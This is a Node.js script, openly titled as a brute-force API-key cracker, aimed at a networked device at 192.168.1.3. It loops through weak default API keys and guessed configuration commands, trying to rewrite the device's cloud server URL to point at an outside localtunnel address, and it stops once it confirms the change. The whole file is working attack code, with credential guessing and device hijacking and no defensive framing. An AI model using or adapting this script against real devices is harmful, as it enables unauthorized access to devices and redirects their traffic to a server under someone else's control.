const http = require('http');

console.log('--- Brute Force Config Setter (Cracking API Key) ---');
console.log('Target: 192.168.1.3');

// The Tunnel URL user provided
const NEW_URL = 'http://funny-cat-99.loca.lt';

// Potential Commands to try
const commands = [
    'SetOptions',
    'SetSysOption',
    'SetNetwork',
    'UpdateOptions',
    'SetDeviceNet'
];

// Potential Keys
const paramKeys = [
    'CloudServerUrl',
    'ServerUrl',
    'ADMSUrl',
    'CloudUrl'
];

// Potential API Keys to try
const apiKeys = ['', '0', '1234', '888888', '111111', 'admin', 'comkey'];

async function sendCommand(cmd, payload, apiKey) {
    return new Promise((resolve) => {
        const data = JSON.stringify({
            "mid": Date.now().toString(),
            "cmd": cmd,
            "payload": payload
        });

        const options = {
            hostname: '192.168.1.3',
            port: 80,
            path: '/control?api_key=' + encodeURIComponent(apiKey),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            },
            timeout: 3000
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                resolve({ status: res.statusCode, body: body });
            });
        });

        req.on('error', (e) => {
            resolve({ error: e.message });
        });

        req.write(data);
        req.end();
    });
}

async function run() {
    console.log('--- Starting Brute Force Loop ---');

    for (const apiKey of apiKeys) {
        console.log(`\n>>> Testing with API KEY: '${apiKey}' <<<`);

        for (const cmd of commands) {
            for (const key of paramKeys) {
                // console.log(`   Trying ${cmd} | ${key} ...`);

                const payload = {};
                payload[key] = NEW_URL;

                const res = await sendCommand(cmd, payload, apiKey);

                if (res.error) {
                    // console.log(`   -> Error: ${res.error}`);
                } else {
                    // If NOT 403, we found something interesting!
                    // 403 = Invalid API Key (Access Denied)
                    // 200 = OK (or logical error like 'unknown_command' which returns 200 usually)

                    if (res.status !== 403 && !res.body.includes('Invalid API Key')) {
                        console.log(`\n!!!!!!!!!! FOUND POSSIBLE SUCCESS !!!!!!!!!!`);
                        console.log(`API KEY: '${apiKey}'`);
                        console.log(`CMD: ${cmd}`);
                        console.log(`PARAM: ${key}`);
                        console.log(`STATUS: ${res.status}`);
                        console.log(`BODY: ${res.body}`);
                        console.log(`!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n`);

                        // If success, we can break or keep trying to be sure
                        if (res.body.includes('Succeed') || res.body.includes('OK')) {
                            console.log("SUCCESS CONFIRMED! Configuration Updated.");
                            return; // Stop on first authentic success
                        }
                    }
                }
            }
        }
    }
    console.log('\n--- Done ---');
}

run();
